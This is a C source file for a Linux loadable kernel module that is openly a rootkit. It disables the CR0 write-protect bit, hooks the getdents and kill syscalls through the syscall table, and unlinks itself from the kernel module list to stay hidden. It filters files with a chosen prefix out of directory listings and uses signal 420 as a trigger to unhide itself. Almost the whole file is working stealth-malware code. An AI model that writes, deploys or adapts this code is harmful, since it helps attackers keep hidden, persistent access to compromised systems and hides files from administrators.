#include "rootkit.h"

static void enable_rw(void) {
  write_cr0(read_cr0() & (~X86_CR0_WP));
}

static void disable_rw(void) {
  write_cr0(read_cr0() | X86_CR0_WP);
}

static asmlinkage long rootkit_kill(pid_t pid, int sig) {
  if (sig == 420) {
    unhide();
  }
  return old_kill(pid, sig);
}

long rootkit_ls_filter(struct linux_dirent __user *dirp, long length) {
  unsigned int offset = 0;
  int err;
  struct linux_dirent *cur_dirp, *base_dirp, *prev = NULL;

  base_dirp = kzalloc(length, GFP_KERNEL);

  if (base_dirp == NULL) {
    return length;
  }

  err = copy_from_user(base_dirp, dirp, length);
  if (err) {
    kfree(base_dirp);
    return length;
  }
  
  while (offset < length) {
    cur_dirp = (void *)base_dirp + offset;
    //this bit draws inspiration from diamorphine; it's just a really smart and concise way of accomplishing it
    if (!strncmp(HIDDEN_FILE_PREFIX, cur_dirp->d_name, strlen(HIDDEN_FILE_PREFIX))) {
      //test if it's the first thing
      if (cur_dirp == base_dirp) {
	//we have to move the beginning of the list here
	//first, we have to decrease the size of the file tree returned, since it's smaller, we're not just
	//doing a fake skip like in the easy case
	length -= base_dirp->d_reclen;
	//then, we move the first pointer to the second based on the offset
	memmove(base_dirp, (void *)base_dirp + base_dirp->d_reclen, length);
      }
      //else, just increment reclen so that when reading this file gets skipped over
      else {
	prev->d_reclen += cur_dirp->d_reclen;
      }
    }
    else {
      prev = cur_dirp;
    }
    offset += cur_dirp->d_reclen;
  }

  //done now, so let's copy our changes back in
  err = copy_to_user(dirp, base_dirp, length);
  
  kfree(base_dirp);
  return length;
}

asmlinkage long rootkit_getdents(unsigned int fd,
				 struct linux_dirent __user *dirp,
				 unsigned int count)
{
  int ret;
    
  ret = (*old_getdents)(fd, dirp, count);
  if (ret <= 0) {
    return ret;
  }
  ret = rootkit_ls_filter(dirp, ret);
  return ret;
}

static void hide(void) {
  module_previous = THIS_MODULE->list.prev;
  list_del(&THIS_MODULE->list);
}

static void unhide(void) {
  list_add(&THIS_MODULE->list, module_previous);
}

static int __init rootkit_init(void) {
  sys_call_table = (void *)kallsyms_lookup_name("sys_call_table");

  if (sys_call_table == NULL) {
    printk(KERN_ERR "Couldnt look up sys_call_table\n");
    return -1;
  }
  else {
    printk("Found lookup table at %p\n", sys_call_table);
  }
  enable_rw();
  HOOK(sys_call_table, old_getdents, rootkit_getdents, __NR_getdents);
  HOOK(sys_call_table, old_kill, rootkit_kill, __NR_kill);
  disable_rw();

  hide();
  return 0;
}

static void __exit rootkit_exit(void) {
  enable_rw();
  UNHOOK(sys_call_table, old_getdents, __NR_getdents);
  UNHOOK(sys_call_table, old_kill, __NR_kill);
  disable_rw();
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
